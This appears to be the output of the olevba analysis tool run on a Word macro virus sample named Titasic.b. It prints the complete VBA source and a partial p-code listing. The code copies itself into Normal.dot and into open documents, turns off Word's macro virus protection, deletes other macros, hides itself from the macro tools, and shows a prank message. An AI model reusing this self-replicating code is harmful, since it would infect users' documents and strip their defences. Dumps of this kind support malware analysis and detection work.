olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BmH.bas 
in file: Virus.MSWord.Titasic.b - OLE stream: 'Macros/VBA/BmH'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























Public AD As Object, aDes As Variant
Public NonBmH As Boolean, afound As Boolean, dele As Boolean, reset As Boolean
Public aExc As Boolean, DocCount As Boolean
Function BmHMaster()
    Dim nMac(1) As String
    Dim NT As Object
    Dim aSrc$
    On Error GoTo Selesai
    nMac(0) = "BmH"
    nMac(1) = "Boo"
    
    aSrc = MacroContainer
    Set NT = NormalTemplate
    If Not DocCount Then
        Set AD = ActiveDocument
        ElseIf aSrc <> "SNrml.dot" Then
            aSrc = NT
    End If
    
    If aSrc = NT Then
        aSrc = NT.FullName: Set aDes = AD
    ElseIf aSrc = AD Then
        aSrc = AD.FullName: Set aDes = NT
    ElseIf aSrc = "SNrml.dot" Then
        Set aDes = NT
    aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
    End If
    
    Mdele aDes
    With aDes.VBProject
    If Not (Not dele And .Description = "BmH" And .VBComponents.Count > 2) Then
        MCopy aSrc, aDes, nMac
        dele = False
        .Description = "BmH"
        If aDes = NT Then
            Options.SaveInterval = 1
            CustomizationContext = NT
            CommandBars("Tools").reset
            KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
            Command:="ToolsRecordMacroStart"
            aDes.Save
        End If
        CommandBars("Macro").Controls(2).OnAction = "ViewVBCode"
    Else
        GoTo Aksi
    End If
    End With
    If afound = True Then Exit Function
    refresh
    On Error Resume Next
Aksi:
    If aExc = True Then Exit Function
    Exit Function
Selesai:
    If Err.Number = 50289 Then MsgBox "Word protected from macro viruses", vbInformation, "Microsoft Word"
End Function

Sub Mdele(SFile)
Dim nMac As Object
For Each nMac In SFile.VBProject.VBComponents
    If nMac.Name = "NewMacros" Then NonBmH = True
    If nMac.Name <> "ThisDocument" And nMac.Name <> "NewMacros" And nMac.Name <> "BmH" _
        And nMac.Name <> "Boo" Then
        dele = True
        If reset Then
            Application.OrganizerDelete SFile.FullName, nMac.Name, 3
        Else
            nMac.CodeModule.DeleteLines 1, nMac.CodeModule.CountOfLines
        End If
    End If
Next nMac
End Sub
Sub MCopy(SFile, DFile, nMac)
Dim anMac
For Each anMac In nMac
    Application.OrganizerCopy SFile, DFile.FullName, anMac, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
    .Caption = "Boo"
    Randomize
    Boo.Show
End With
WBT
ActiveDocument.Close 0
WBF
AutoOpen
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
    WBF
    AutoOpen
Else
    WBF
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
BmHMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
        If Documents(i).Name <> ActiveDocument.Name Then
            Set AD = Documents(i)
            DocCount = True
            dele = False
            BmHMaster
        End If
    Next
End If
If Now > DateSerial(1998, 8, 7) Then
    Application.OnTime when:=Now + TimeValue("00:15:00"), Name:="BmH.Action"
End If
End Sub
Sub ViewVbCode()
If MsgBox("Are you sure want to create a new macro ?", vbExclamation + vbYesNo, "MacroBasic") = vbYes Then SendKeys "%m%s{down}~%d'MacroWordBasic'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
    aExc = True
    BmHMaster
    WBT
    AddIns.Unload False
    WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
    If afound = True Then
        Application.Visible = False
        Documents.Add
        BmHMaster
        With ActiveDocument
            .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", _
            FileFormat:=wdFormatDocument, AddtoRecentFiles:=False
            .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", _
            FileFormat:=wdFormatTemplate, AddtoRecentFiles:=False
        End With
    End If
    Application.Quit
batal:
    WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mdele ActiveDocument
If NonBmH Then
    'If MacroContainer = ActiveDocument Then Application.Run
    NormalTemplate.VBProject.Name = ".BmH.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
    With Dialogs(215)
        .Description = "Macros can not be deleted!(descr:'MacroWordBasic')"
        If .Display = 1 Then .Execute
    End With
    Application.DisplayAlerts = -1
Else
    ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function refresh()
reset = True
FileTemplates
Mdele aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
    .SaveNormalPrompt = False
    .SaveInterval = 10
    .VirusProtection = False
End With
If ActiveWindow.Caption <> "Boo" And InStr(1, ActiveDocument.Name, "Document1", 1) = 0 _
    And ActiveDocument.Name <> "SNrml.dot" Then BmHMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
-------------------------------------------------------------------------------
VBA MACRO Boo.frm 
in file: Virus.MSWord.Titasic.b - OLE stream: 'Macros/VBA/Boo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





















































Dim teks(4) As String
Private Sub CommandButton1_Click()
Unload Me
End Sub
Private Sub UserForm_Activate()
Image1.Picture = LoadPicture(System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper"))
BmHB
Unload Me
End Sub
Sub BmHB()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%
a = 1
diam = True
Boo.Enabled = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
        Label4.ForeColor = Boo.BackColor
    End If
    If tp Mod 600 = 0 Then
        Label4.ForeColor = &H80000009
    End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        Label1.Caption = Label1.Caption & Mid(teks(a), i, 1)
        If Mid(teks(a), i, 1) Like "[!]" Then Beep
        If Len(Label1.Caption) = Len(teks(a)) Then
            If diam Then
                Do
                    If Timer - tm > 1 Then Exit Do
                        DoEvents
                        Label4.ForeColor = Boo.BackColor
                Loop
                        diam = False
                        If a = 4 Then GoTo catat
            End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
    Loop
    Exit Sub
catat:
    If a <> 5 Then Label1.Caption = ""
    tm = Timer
    Label2.Left = Label1.Left
    a = a + 1
    i = 0
    diam = True
    If a = 5 Then
        Label2.Left = Label1.Left
        Label4.Visible = False
        Frame1.Visible = True
        Image1.Visible = True
        Boo.Enabled = True
        CommandButton1.SetFocus
        Exit Sub
    End If
Return
End Sub
Private Sub UserForm_Layout()
teks(1) = "Infected Boomv1.01"
teks(2) = "Me, No longer to stay in your computer!"
teks(3) = "Beware of the Boomv1.01!"
Label2.Left = Label1.Left
Label3.Caption = "BmH guess who(m) am I" & Chr(13) & "thanks to " & Application.UserName
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Titasic.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/BmH - 11391 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #30:
' 	Dim (Public) 
' 	VarDefn NonBmH (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn dele (As Boolean)
' 	VarDefn reset (As Boolean)
' Line #31:
' 	Dim (Public) 
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #32:
' 	FuncDefn (Function BmHMaster())
' Line #33:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nMac (As String)
' Line #34:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #35:
' 	Dim 
' 	VarDefn aSrc
' Line #36:
' 	OnError Selesai 
' Line #37:
' 	LitStr 0x0003 "BmH"
' 	LitDI2 0x0000 
' 	ArgsSt nMac 0x0001 
' Line #38:
' 	LitStr 0x0003 "Boo"
' 	LitDI2 0x0001 
' 	ArgsSt nMac 0x0001 
' Line #39:
' Line #40:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #41:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #42:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #43:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #44:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #45:
' 	Ld NT 
' 	St aSrc 
' Line #46:
' 	EndIfBlock 
' Line #47:
' Line #48:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #50:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #51:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #52:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #53:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #54:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	St aSrc 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	Ld aDes 
' 	ArgsCall Mdele 0x0001 
' Line #58:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #59:
' 	Ld dele 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0003 "BmH"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #60:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nMac 
' 	ArgsCall MCopy 0x0003 
' Line #61:
' 	LitVarSpecial (False)
' 	St dele 
' Line #62:
' 	LitStr 0x0003 "BmH"
' 	MemStWith Description 
' Line #63:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #65:
' 	Ld NT 
' 	St CustomizationContext 
' Line #66:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #67:
' 	LineCont 0x0004 10 00 0C 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #68:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	LitStr 0x000A "ViewVBCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #71:
' 	ElseBlock 
' Line #72:
' 	GoTo Aksi 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndWith 
' Line #75:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #76:
' 	ArgsCall refresh 0x0000 
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Label Aksi 
' Line #79:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #80:
' 	ExitFunc 
' Line #81:
' 	Label Selesai 
' Line #82:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0021 "Word protected from macro viruses"
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #83:
' 	EndFunc 
' Line #84:
' Line #85:
' 	FuncDefn (Sub Mdele(SFile))
' Line #86:
' 	Dim 
' 	VarDefn nMac (As Object)
' Line #87:
' 	StartForVariable 
' 	Ld nMac 
' 	EndForVariable 
' 	Ld SFile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #88:
' 	Ld nMac 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonBmH 
' 	EndIf 
' Line #89:
' 	LineCont 0x0004 12 00 08 00
' 	Ld nMac 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nMac 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nMac 
' 	MemLd New 
' 	LitStr 0x0003 "BmH"
' 	Ne 
' 	And 
' 	Ld nMac 
' 	MemLd New 
' 	LitStr 0x0003 "Boo"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #90:
' 	LitVarSpecial (True)
' 	St dele 
' Line #91:
' 	Ld reset 
' 	IfBlock 
' Line #92:
' 	Ld SFile 
' 	MemLd FullName 
' 	Ld nMac 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #93:
' 	ElseBlock 
' Line #94:
' 	LitDI2 0x0001 
' 	Ld nMac 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nMac 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	StartForVariable 
' 	Ld nMac 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub MCopy(SFile, DFile, nMac))
' Line #100:
' 	Dim 
' 	VarDefn anMac
' Line #101:
' 	StartForVariable 
' 	Ld anMac 
' 	EndForVariable 
' 	Ld nMac 
' 	ForEach 
' Line #102:
' 	Ld SFile 
' 	Ld DFile 
' 	MemLd FullName 
' 	Ld anMac 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub Action())
' Line #106:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #109:
' 	LitStr 0x0003 "Boo"
' 	MemStWith Caption 
' Line #110:
' 	ArgsCall Read 0x0000 
' Line #111:
' 	Ld Boo 
' 	ArgsMemCall Show 0x0000 
' Line #112:
' 	EndWith 
' Line #113:
' 	ArgsCall WBT 0x0000 
' Line #114:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #115:
' 	ArgsCall WBF 0x0000 
' Line #116:
' 	ArgsCall AutoOpen 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub FileOpen())
' Line #119:
' 	ArgsCall WBT 0x0000 
' Line #120:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #121:
' 	ArgsCall WBF 0x0000 
' Line #122:
' 	ArgsCall AutoOpen 0x0000 
' Line #123:
' 	ElseBlock 
' Line #124:
' 	ArgsCall WBF 0x0000 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub AutoOpen())
' Line #128:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #129:
' 	ArgsCall BmHMaster 0x0000 
' Line #130:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #132:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #133:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #134:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #135:
' 	LitVarSpecial (False)
' 	St dele 
' Line #136:
' 	ArgsCall BmHMaster 0x0000 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	StartForVariable 
' 	Next 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	Ld Now 
' 	LitDI2 0x07CE 
' 	LitDI2 0x0008 
' 	LitDI2 0x0007 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	IfBlock 
' Line #141:
' 	Ld Now 
' 	LitStr 0x0008 "00:15:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000A "BmH.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Sub ViewVbCode())
' Line #145:
' 	LitStr 0x0029 "Are you sure want to create a new macro ?"
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x000A "MacroBasic"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "%m%s{down}~%d'MacroWordBasic'%m"
' 	ArgsCall SendKeys 0x0001 
' 	EndIf 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub AutoExec())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #150:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #151:
' 	ArgsCall BmHMaster 0x0000 
' Line #152:
' 	ArgsCall WBT 0x0000 
' Line #153:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #154:
' 	ArgsCall WBF 0x0000 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub AutoExit())
' Line #159:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #160:
' 	OnError batal 
' Line #161:
' 	ArgsCall WBT 0x0000 
' Line #162:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #163:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #164:
' 	LitVarSpecial (True)
' 	St afound 
' Line #165:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #166:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #167:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #168:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #170:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #171:
' 	ArgsCall BmHMaster 0x0000 
' Line #172:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #173:
' 	LineCont 0x0004 0D 00 0C 00
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddtoRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #174:
' 	LineCont 0x0004 0D 00 0C 00
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddtoRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #175:
' 	EndWith 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #178:
' 	Label batal 
' Line #179:
' 	ArgsCall WBF 0x0000 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Sub ToolsMacro())
' Line #182:
' 	ArgsCall WBF 0x0000 
' Line #183:
' 	OnError batal 
' Line #184:
' 	Ld ActiveDocument 
' 	ArgsCall Mdele 0x0001 
' Line #185:
' 	Ld NonBmH 
' 	IfBlock 
' Line #186:
' 	QuoteRem 0x0004 0x0037 "If MacroContainer = ActiveDocument Then Application.Run"
' Line #187:
' 	LitStr 0x000F ".BmH.ToolsMacro"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' 	BoS 0x0000 
' 	ExitSub 
' Line #188:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #189:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #190:
' 	LitStr 0x0032 "Macros can not be deleted!(descr:'MacroWordBasic')"
' 	MemStWith Description 
' Line #191:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #192:
' 	EndWith 
' Line #193:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #194:
' 	ElseBlock 
' Line #195:
' 	ArgsCall ViewVbCode 0x0000 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	Label batal 
' Line #198:
' 	EndSub 
' Line #199:
' 	FuncDefn (Sub FileTemplates())
' Line #200:
' 	ArgsCall WBF 0x0000 
' Line #201:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub FormatStyle())
' Line #204:
' 	ArgsCall WBF 0x0000 
' Line #205:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #206:
' 	EndSub 
' Line #207:
' 	FuncDefn (Function refresh())
' Line #208:
' 	LitVarSpecial (True)
' 	St reset 
' Line #209:
' 	ArgsCall FileTemplates 0x0000 
' Line #210:
' 	Ld aDes 
' 	ArgsCall Mdele 0x0001 
' Line #211:
' 	EndFunc 
' Line #212:
' 	FuncDefn (Sub AutoClose())
' Line #213:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #214:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #215:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #216:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #217:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #218:
' 	EndWith 
' Line #219:
' 	LineCont 0x0004 15 00 04 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0003 "Boo"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "Document1"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall BmHMaster 0x0000 
' 	EndIf 
' Line #220:
' 	EndSub 
' Line #221:
' 	FuncDefn (Sub FileExit())
' Line #222:
' 	ArgsCall AutoExit 0x0000 
' Line #223:
' 	EndSub 
' Line #224:
' 	FuncDefn (Sub ToolsOptions())
' Line #225:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #226:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #227:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #228:
' 	EndSub 
' Line #229:
' 	FuncDefn (Function WBT())
' Line #230:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #231:
' 	EndFunc 
' Line #232:
' 	FuncDefn (Function WBF())
' Line #233:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #234:
' 	EndFunc 
' Macros/VBA/Boo - 5319 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0004 
' 	VarDefn teks (As String)
' Line #54:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #55:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #58:
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	ArgsLd LoadPicture 0x0001 
' 	Ld Image1 
' 	MemSt Picture 
' Line #59:
' 	ArgsCall BmHB 0x0000 
' Line #60:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub BmHB())
' Line #63:
' 	Dim 
' 	VarDefn a (As Byte)
' 	VarDefn diam (As Boolean)
' Line #64:
' 	Dim 
' 	VarDefn tp
' 	VarDefn tm
' 	VarDefn sel
